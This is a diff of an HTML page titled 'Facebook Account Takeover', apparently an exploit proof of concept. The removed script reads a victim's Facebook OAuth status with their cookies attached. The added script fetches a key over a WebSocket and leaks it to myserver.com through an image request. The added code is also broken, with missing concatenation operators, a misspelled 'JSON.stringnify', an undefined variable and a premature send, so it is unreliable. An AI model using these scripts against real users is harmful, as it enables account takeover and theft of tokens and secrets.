@@ -4,15 +4,15 @@
 <body>
 <h1>Facebook Account Takeover</h1>
 <script>
-  var req = new XMLHttpRequest(); 
-req.onload = reqListener; 
-req.open('get','https://www.facebook.com/x/oauth/status?client_id=2149688395347028&input_token&origin=1&redirect_uri=https%3A%2F%2Fbutanenacho.github.io%2Fsite%2F&sdk=joey&wants_cookie_data=true',true); 
-req.withCredentials = true;
-req.send();
-
-function reqListener() {
-    alert(this.responseText) 
-};
+  
+  var wsurl = "ws://ptl-f3fa129f-645ac88d.libcurl.so"; 
+  var ws = new WebSocket(wsurl); 
+  ws.onmessage = function(){
+    var data = JSON.parse(message.data)
+    document.write('<img src="https://myserver.com/?key='data.text'"/>')
+  }
+  ws.send(JSON.stringnify{text: "/getkey" })
+  
 </script>  
 </body>
 </html>
